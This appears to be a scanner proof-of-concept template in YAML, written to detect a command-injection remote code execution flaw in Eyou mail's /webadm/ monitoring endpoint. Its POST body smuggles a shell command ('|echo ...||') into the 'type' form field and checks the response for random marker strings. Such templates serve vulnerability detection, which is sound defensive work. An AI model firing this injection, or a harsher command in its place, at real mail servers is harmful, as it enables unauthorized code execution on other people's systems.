name: poc-yaml-eyou-mail-rce
transport: http
set:
  r1: randomLowercase(10)
  r2: randomLowercase(10)
rules:
  r1:
    request:
      method: POST
      path: /webadm/?q=moni_detail.do&action=gragh
      headers:
        Content-Type: application/x-www-form-urlencoded
      body: type='|echo {{r1}}%25{{r2}}||'
      follow_redirects: true
    expression: |
     response.body.bcontains(bytes(r1+"%"+r2))
expression:
    r1()
detail:
  author: york
  links:  
    - https://blog.csdn.net/qq_45742511/article/details/115734373
